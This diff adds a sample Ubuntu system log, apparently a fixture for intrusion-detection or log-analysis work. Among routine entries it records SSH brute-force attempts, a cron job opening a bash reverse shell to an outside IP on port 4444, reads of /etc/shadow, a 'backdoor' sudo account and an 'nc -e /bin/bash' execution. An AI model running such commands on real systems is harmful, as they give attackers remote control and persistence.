@@ -1,0 +1,38 @@
+Feb  7 08:00:01 ubuntu-srv-01 CRON[12345]: (root) CMD (/usr/lib/php/sessionclean)
+Feb  7 08:01:15 ubuntu-srv-01 systemd[1]: Starting Daily apt download activities...
+Feb  7 08:01:17 ubuntu-srv-01 systemd[1]: Started Daily apt download activities.
+Feb  7 08:05:22 ubuntu-srv-01 sshd[15234]: Accepted publickey for deploy from 10.0.1.50 port 52341 ssh2: RSA SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8
+Feb  7 08:05:22 ubuntu-srv-01 sshd[15234]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Feb  7 08:05:23 ubuntu-srv-01 systemd-logind[892]: New session 145 of user deploy.
+Feb  7 08:10:33 ubuntu-srv-01 sshd[15890]: Failed password for invalid user admin from 185.234.72.15 port 44521 ssh2
+Feb  7 08:10:35 ubuntu-srv-01 sshd[15892]: Failed password for invalid user admin from 185.234.72.15 port 44522 ssh2
+Feb  7 08:10:37 ubuntu-srv-01 sshd[15894]: Failed password for invalid user root from 185.234.72.15 port 44523 ssh2
+Feb  7 08:10:39 ubuntu-srv-01 sshd[15896]: Failed password for invalid user test from 185.234.72.15 port 44524 ssh2
+Feb  7 08:10:41 ubuntu-srv-01 sshd[15898]: Failed password for invalid user guest from 185.234.72.15 port 44525 ssh2
+Feb  7 08:10:43 ubuntu-srv-01 sshd[15900]: Failed password for invalid user oracle from 185.234.72.15 port 44526 ssh2
+Feb  7 08:10:45 ubuntu-srv-01 sshd[15902]: Failed password for invalid user postgres from 185.234.72.15 port 44527 ssh2
+Feb  7 08:15:00 ubuntu-srv-01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00:00:16:3e:4a:3b:5c:08:00 SRC=91.189.114.8 DST=192.168.1.10 LEN=60 TOS=0x00 PREC=0x00 TTL=49 ID=54321 DF PROTO=TCP SPT=12345 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+Feb  7 08:20:12 ubuntu-srv-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+Feb  7 08:20:15 ubuntu-srv-01 sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1000)
+Feb  7 08:25:33 ubuntu-srv-01 kernel: [UFW AUDIT] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00:00:16:3e:4a:3b:5c:08:00 SRC=10.0.1.100 DST=192.168.1.10 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=443 DPT=52341 WINDOW=65535 RES=0x00 ACK URGP=0
+Feb  7 08:30:00 ubuntu-srv-01 crontab[16234]: (www-data) REPLACE (www-data)
+Feb  7 08:30:01 ubuntu-srv-01 CRON[16240]: (www-data) CMD (/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.35/4444 0>&1')
+Feb  7 08:30:02 ubuntu-srv-01 kernel: [NETFILTER] BLOCKED OUTBOUND: IN= OUT=eth0 SRC=192.168.1.10 DST=185.220.101.35 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54322 DF PROTO=TCP SPT=54123 DPT=4444
+Feb  7 08:35:15 ubuntu-srv-01 systemd[1]: Starting Apache HTTP Server...
+Feb  7 08:35:17 ubuntu-srv-01 systemd[1]: Started Apache HTTP Server.
+Feb  7 08:40:22 ubuntu-srv-01 kernel: [  456.789012] audit: type=1400 audit(1707292822.123:456): apparmor="DENIED" operation="open" profile="/usr/sbin/mysqld" name="/etc/shadow" pid=16789 comm="mysqld" requested_mask="r" denied_mask="r" fsuid=999 ouid=0
+Feb  7 08:45:00 ubuntu-srv-01 sshd[17123]: Accepted password for jsmith from 192.168.1.50 port 52890 ssh2
+Feb  7 08:45:01 ubuntu-srv-01 sshd[17123]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
+Feb  7 08:50:33 ubuntu-srv-01 sudo: jsmith : TTY=pts/1 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Feb  7 08:50:34 ubuntu-srv-01 sudo: pam_unix(sudo:session): session opened for user root by jsmith(uid=1001)
+Feb  7 08:55:12 ubuntu-srv-01 groupadd[17456]: group added to /etc/group: name=backdoor, GID=1337
+Feb  7 08:55:15 ubuntu-srv-01 useradd[17458]: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash
+Feb  7 08:55:18 ubuntu-srv-01 usermod[17460]: add 'backdoor' to group 'sudo'
+Feb  7 09:00:00 ubuntu-srv-01 CRON[17500]: (root) CMD (/usr/local/bin/backup.sh)
+Feb  7 09:05:22 ubuntu-srv-01 kernel: [  789.012345] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.
+Feb  7 09:10:15 ubuntu-srv-01 sshd[17890]: reverse mapping checking getaddrinfo for unknown.example.com [185.234.72.15] failed - POSSIBLE BREAK-IN ATTEMPT!
+Feb  7 09:15:30 ubuntu-srv-01 su[18123]: pam_unix(su:auth): authentication failure; logname=www-data uid=33 euid=0 tty=/dev/pts/2 ruser=www-data rhost=  user=root
+Feb  7 09:15:32 ubuntu-srv-01 su[18123]: FAILED su for root by www-data
+Feb  7 09:20:00 ubuntu-srv-01 kernel: [  890.123456] Out of memory: Kill process 18234 (java) score 950 or sacrifice child
+Feb  7 09:25:45 ubuntu-srv-01 systemd[1]: snap.lxd.daemon.service: Main process exited, code=killed, status=9/KILL
+Feb  7 09:30:12 ubuntu-srv-01 auditd[456]: type=EXECVE msg=audit(1707294612.789:1234): argc=3 a0="/bin/nc" a1="-e" a2="/bin/bash"
